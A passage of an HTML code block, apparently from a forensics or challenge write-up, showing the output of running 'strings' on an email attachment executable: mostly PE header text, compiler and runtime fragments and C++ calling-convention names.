<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br></pre></td><td class="code"><pre><span class="line">└─# strings attachment.exe</span><br><span class="line">!This program cannot be run in DOS mode.</span><br><span class="line">Rich`g</span><br><span class="line">.text</span><br><span class="line">`.rdata</span><br><span class="line">@.data</span><br><span class="line">.fptable</span><br><span class="line">.reloc</span><br><span class="line">u&quot;h</span><br><span class="line">h`qA</span><br><span class="line">hDqA</span><br><span class="line">h@qA</span><br><span class="line">h8qA</span><br><span class="line">Y_^[</span><br><span class="line">Y_^[</span><br><span class="line">&gt;csm</span><br><span class="line">SVW3</span><br><span class="line">ineI</span><br><span class="line">5ntel</span><br><span class="line">5Genu</span><br><span class="line">t#=`</span><br><span class="line">j$X9E</span><br><span class="line">_^[3</span><br><span class="line">j X+</span><br><span class="line">_^[]</span><br><span class="line">8_^]</span><br><span class="line">8csm</span><br><span class="line">8csm</span><br><span class="line">Y_^[</span><br><span class="line">t2VW</span><br><span class="line">&gt;csm</span><br><span class="line">?RCC</span><br><span class="line">?MOC</span><br><span class="line">?csm</span><br><span class="line">URPQQh</span><br><span class="line">L$,3</span><br><span class="line">UVWS</span><br><span class="line">[_^]</span><br><span class="line">SVWj</span><br><span class="line">Rh%&lt;@</span><br><span class="line">_^[]</span><br><span class="line">=0qA</span><br><span class="line">BVj(j</span><br><span class="line">hw&lt;@</span><br><span class="line">UQPXY]Y[</span><br><span class="line">Wu%j</span><br><span class="line">h |A</span><br><span class="line">Vh8|A</span><br><span class="line">h0|A</span><br><span class="line">h8|A</span><br><span class="line">%TpA</span><br><span class="line">VhL|A</span><br><span class="line">hD|A</span><br><span class="line">hL|A</span><br><span class="line">Vh\|A</span><br><span class="line">hT|A</span><br><span class="line">h\|A</span><br><span class="line">Vhp|A</span><br><span class="line">hh|A</span><br><span class="line">hp|A</span><br><span class="line">h||A</span><br><span class="line">QQSVWd</span><br><span class="line">;p$u</span><br><span class="line">p$^]</span><br><span class="line">oF f</span><br><span class="line">oF f</span><br><span class="line">oF f</span><br><span class="line">oV f</span><br><span class="line">o^0f</span><br><span class="line">of@f</span><br><span class="line">onPf</span><br><span class="line">ov`f</span><br><span class="line">o~pf</span><br><span class="line">FGIu</span><br><span class="line">FGIu</span><br><span class="line">YYPV</span><br><span class="line">Y_^[</span><br><span class="line">Y_^[</span><br><span class="line">u SW</span><br><span class="line">EE,P</span><br><span class="line">_^[]</span><br><span class="line">dSVW</span><br><span class="line">;csm</span><br><span class="line">;csm</span><br><span class="line">u       9s</span><br><span class="line">;csm</span><br><span class="line">v!8E</span><br><span class="line">u QW</span><br><span class="line">uj_^[</span><br><span class="line">EE$P</span><br><span class="line">;MOC</span><br><span class="line">;RCC</span><br><span class="line">@u)j</span><br><span class="line">u Qj</span><br><span class="line">@_^[]</span><br><span class="line">9p u&quot;</span><br><span class="line">:csm</span><br><span class="line">ft&amp;9q</span><br><span class="line">:csm</span><br><span class="line">r49z</span><br><span class="line">@_^[]</span><br><span class="line">RVWS</span><br><span class="line">Y_^[</span><br><span class="line">&gt;csm</span><br><span class="line">8csm</span><br><span class="line">t0QW</span><br><span class="line">Y_^[</span><br><span class="line">hcsm</span><br><span class="line">u+;&#125;</span><br><span class="line">Y_^[</span><br><span class="line">unWQ</span><br><span class="line">Y_^[</span><br><span class="line">PPPPP</span><br><span class="line">,0&lt;     w</span><br><span class="line">,0&lt;     w</span><br><span class="line">SSSSS</span><br><span class="line">9^4t</span><br><span class="line">SSSSS</span><br><span class="line">9^4t</span><br><span class="line">SSSSS</span><br><span class="line">9^4t</span><br><span class="line">G0_^[]</span><br><span class="line">QSVW</span><br><span class="line">G0_^[</span><br><span class="line">QSVW</span><br><span class="line">G0_^[</span><br><span class="line">QQSVW</span><br><span class="line">G0_^[</span><br><span class="line">t&lt;Sj</span><br><span class="line">G0_^[</span><br><span class="line">QQSVW</span><br><span class="line">G0_^[</span><br><span class="line">SSSSS</span><br><span class="line">^88_</span><br><span class="line">SSSSS</span><br><span class="line">SSSSS</span><br><span class="line">A-&lt;Fu</span><br><span class="line">&lt;Nu4</span><br><span class="line">RRRRR</span><br><span class="line">9Q(u</span><br><span class="line">&lt;ItC&lt;Lt3&lt;Tt#&lt;h</span><br><span class="line">8&lt;6u</span><br><span class="line">A&lt;lt&#x27;&lt;tt</span><br><span class="line">&lt;zu1</span><br><span class="line">SVWP</span><br><span class="line">Xt$+</span><br><span class="line">F +F4+</span><br><span class="line">~2Pj0</span><br><span class="line">;F4u</span><br><span class="line">;F4u</span><br><span class="line">Y_^[</span><br><span class="line">QQSW</span><br><span class="line">^j4Yt</span><br><span class="line">C-&lt;at</span><br><span class="line">SWVQP</span><br><span class="line">&lt;Gu-</span><br><span class="line">&lt;-u</span><br><span class="line">G4QP</span><br><span class="line">O0_[</span><br><span class="line">PPPPP</span><br><span class="line">w0SV</span><br><span class="line">w0SV</span><br><span class="line">QSVW</span><br><span class="line">PPPPP</span><br><span class="line">PPPPP</span><br><span class="line">PPPPPPPP</span><br><span class="line">wGt&gt;</span><br><span class="line">PVVS</span><br><span class="line">Y[^_</span><br><span class="line">&lt; t1&lt;   t-</span><br><span class="line">=t7j</span><br><span class="line">Y_^[</span><br><span class="line">PPPPP</span><br><span class="line">Y_^]</span><br><span class="line">SSSSj</span><br><span class="line">Y_^[</span><br><span class="line">j Y+</span><br><span class="line">htqA</span><br><span class="line">hdqA</span><br><span class="line">YYh|qA</span><br><span class="line">hxqA</span><br><span class="line">Y_^[</span><br><span class="line">=csm</span><br><span class="line">h#lA</span><br><span class="line">h@lA</span><br><span class="line">Y_^[</span><br><span class="line">Y_^[</span><br><span class="line">Y_^[</span><br><span class="line">&gt;_^]</span><br><span class="line">f;1u</span><br><span class="line">%0qA</span><br><span class="line">PPPPP</span><br><span class="line">;1t+;u</span><br><span class="line">j-h@</span><br><span class="line">QSVW</span><br><span class="line">Wu;j</span><br><span class="line">h |A</span><br><span class="line">Y_^[</span><br><span class="line">Y_^[</span><br><span class="line">j,hx</span><br><span class="line">Y_^[</span><br><span class="line">_^[]</span><br><span class="line">SVW3</span><br><span class="line">Y_^[</span><br><span class="line">_^[]</span><br><span class="line">M,j&quot;^QRRRRR</span><br><span class="line">u$RV</span><br><span class="line">j0Xu3</span><br><span class="line">j0Yf</span><br><span class="line">Vj0XPW</span><br><span class="line">r&quot;Sj</span><br><span class="line">dr&#x27;j</span><br><span class="line">jdVS</span><br><span class="line">j0Yj</span><br><span class="line">j0Yj</span><br><span class="line">M$j&quot;^Q</span><br><span class="line">QQQQQ</span><br><span class="line">80t/</span><br><span class="line">-jd_;</span><br><span class="line">QQQQQ</span><br><span class="line">PSWV</span><br><span class="line">Wj0V</span><br><span class="line">&#125;&#x27;9E</span><br><span class="line"> _^[</span><br><span class="line">PPPPP</span><br><span class="line">t,9F</span><br><span class="line">_^[]</span><br><span class="line">QQSVW</span><br><span class="line">SSSSS</span><br><span class="line">u0SP</span><br><span class="line">u0St:</span><br><span class="line">(_^[</span><br><span class="line">j&quot;_3</span><br><span class="line">VPPPPP</span><br><span class="line">QSVW</span><br><span class="line">u Vh</span><br><span class="line">f94H</span><br><span class="line">~&#x27;;Z</span><br><span class="line">Wj      P</span><br><span class="line">Wj      P</span><br><span class="line">_^[]</span><br><span class="line">Y_^[</span><br><span class="line">Y_^[</span><br><span class="line">Y_^[</span><br><span class="line">Y_^[</span><br><span class="line">SVhd</span><br><span class="line">FLY;</span><br><span class="line">t       iu</span><br><span class="line">SSSSj</span><br><span class="line">_^[]</span><br><span class="line">*?QP</span><br><span class="line">PPPPP</span><br><span class="line">WWWWW</span><br><span class="line">&lt;:u</span><br><span class="line">SSSPSQ</span><br><span class="line">/&lt;.u</span><br><span class="line">uSSSSj</span><br><span class="line">_[^]</span><br><span class="line">Y_^[</span><br><span class="line">_^[]</span><br><span class="line">IH;A</span><br><span class="line">9wLt</span><br><span class="line">;3t&#x27;</span><br><span class="line">Y_^[</span><br><span class="line">X_^]</span><br><span class="line">wFt&amp;</span><br><span class="line">w=ty</span><br><span class="line">*ti-</span><br><span class="line">tL-c</span><br><span class="line">f9:t!V</span><br><span class="line">f9:u</span><br><span class="line">SSSS</span><br><span class="line">PVSS</span><br><span class="line">Wj=V</span><br><span class="line">u|9]</span><br><span class="line">Y_^[</span><br><span class="line">SSSSS</span><br><span class="line">PPPPP</span><br><span class="line">QQSVj8j@</span><br><span class="line">Y_[^]</span><br><span class="line">Y_^[</span><br><span class="line">xg;5</span><br><span class="line">_^[]</span><br><span class="line">@9&#125;</span><br><span class="line">YY^]</span><br><span class="line">Y_^[</span><br><span class="line">_^[]</span><br><span class="line">Y_^[</span><br><span class="line">Y_^[</span><br><span class="line">Y_^[</span><br><span class="line">Y_^[</span><br><span class="line">SVW3</span><br><span class="line">_^[]</span><br><span class="line">WWWWW</span><br><span class="line">Y_^[</span><br><span class="line">PPPPP</span><br><span class="line">Y_^[</span><br><span class="line">xE;5</span><br><span class="line">SVWP</span><br><span class="line">SS@j</span><br><span class="line">L2.;</span><br><span class="line">Y_^[</span><br><span class="line">PVVVVV</span><br><span class="line">Y_^[</span><br><span class="line">SPPP</span><br><span class="line">[_^]</span><br><span class="line">^PQQQQQ</span><br><span class="line">E ^PQQQQ</span><br><span class="line">&gt;;9u</span><br><span class="line">wIPS3</span><br><span class="line">sv+3</span><br><span class="line">sv+3</span><br><span class="line">sv*Q</span><br><span class="line">sv*Q</span><br><span class="line">j&amp;Z;</span><br><span class="line">j&amp;Z;</span><br><span class="line">E H;</span><br><span class="line">j       _;</span><br><span class="line">PPPPP</span><br><span class="line">YY^[]</span><br><span class="line">@( t</span><br><span class="line">w WS</span><br><span class="line">u$_[</span><br><span class="line">PPPPPPPP</span><br><span class="line">PPPPPWV</span><br><span class="line">QQQP</span><br><span class="line">PPPSW</span><br><span class="line">PP9E u</span><br><span class="line">PPSWP</span><br><span class="line">VPRQ</span><br><span class="line">PRPQh</span><br><span class="line">^[_]</span><br><span class="line">Y_^[</span><br><span class="line">Y_^[</span><br><span class="line">Y_^[</span><br><span class="line">Y_^[</span><br><span class="line">xK;5</span><br><span class="line">PQQQ</span><br><span class="line">PVVVVV</span><br><span class="line">Y_^[</span><br><span class="line">?VWk</span><br><span class="line">D8(Ht</span><br><span class="line">^f93u</span><br><span class="line">D8(HXtIf</span><br><span class="line">Nf9E</span><br><span class="line">Xf9E</span><br><span class="line">D8(Ht5F</span><br><span class="line">-^_[</span><br><span class="line">_f9;u</span><br><span class="line">Y_^[</span><br><span class="line">|*=2</span><br><span class="line">$SVW</span><br><span class="line">u       ^[3</span><br><span class="line">Wj      V</span><br><span class="line">&lt;$tL</span><br><span class="line"> u S</span><br><span class="line">&#123; WPV</span><br><span class="line">C VP</span><br><span class="line">w3t&quot;</span><br><span class="line">AP_^</span><br><span class="line">AP_^</span><br><span class="line">_^[]</span><br><span class="line">Y_^[</span><br><span class="line">Y_^[</span><br><span class="line">Y__^[</span><br><span class="line">v       N+D$</span><br><span class="line">WVS3</span><br><span class="line">WVU3</span><br><span class="line">v       N+D$</span><br><span class="line">^_[3</span><br><span class="line">0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz+/</span><br><span class="line">__based(</span><br><span class="line">__cdecl</span><br><span class="line">__stdcall</span><br><span class="line">__thiscall</span><br><span class="line">__fastcall</span><br><span class="line">__vectorcall</span><br><span class="line">__preserve_none</span><br><span class="line">__clrcall</span><br><span class="line">__eabi</span><br><span class="line">__swift_1</span><br><span class="line">__swift_2</span><br><span class="line">__swift_3</span><br><span class="line">__ptr64</span><br><span class="line">__restrict</span><br><span class="line">__unaligned</span><br><span class="line">restrict(</span><br><span class="line"> new</span><br><span class="line"> delete</span><br><span class="line">operator</span><br><span class="line">`vftable&#x27;</span><br><span class="line">`vbtable&#x27;</span><br><span class="line">`vcall&#x27;</span><br><span 